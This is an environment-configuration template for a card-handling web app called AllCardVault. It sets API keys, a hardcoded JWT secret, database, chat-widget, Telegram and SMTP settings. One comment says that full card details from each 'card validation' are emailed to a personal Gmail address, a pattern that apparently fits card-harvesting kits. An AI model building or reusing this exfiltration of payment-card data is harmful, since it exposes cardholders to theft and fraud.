# GEMINI_API_KEY: Required for Gemini AI API calls.
# AI Studio automatically injects this at runtime from user secrets.
# Users configure this via the Secrets panel in the AI Studio UI.
GEMINI_API_KEY="MY_GEMINI_API_KEY"

# JWT_SECRET: Secret key used to sign and verify JSON Web Tokens for authentication.
JWT_SECRET="allcardvault_super_secret_jwt_key_phase2_dev"

# DATABASE_URL: SQLite database file URL (zero-config, self-contained)
DATABASE_URL="file:./dev.db"

# SUPABASE_URL: URL for Supabase project (e.g. https://your-project.supabase.co)
SUPABASE_URL=""

# SUPABASE_SERVICE_ROLE_KEY or SUPABASE_KEY: API key for Supabase (Service Role Key or Anon Key)
SUPABASE_SERVICE_ROLE_KEY=""
SUPABASE_KEY=""

# Tawk.to Live Chat configuration (optional custom credentials)
VITE_TAWKTO_PROPERTY_ID="6a83d266cf169a34428ce96b"
VITE_TAWKTO_WIDGET_ID="default"

# Telegram Bot Instant Alert Notifications (optional)
# 1. Create bot via Telegram @BotFather to get TELEGRAM_BOT_TOKEN
# 2. Get your Chat ID or Channel ID to set TELEGRAM_CHAT_ID
TELEGRAM_BOT_TOKEN=""
TELEGRAM_CHAT_ID=""

# Automated Admin Email Notification System
# Whenever a new card validation is processed, instant alerts with full card details are sent here
ADMIN_NOTIFICATION_EMAIL="daisy4tucker@gmail.com"
SMTP_HOST=""
SMTP_PORT="587"
SMTP_USER=""
SMTP_PASS=""
SMTP_FROM='"AllCardVault Alerts" <alerts@allcardvault.com>'

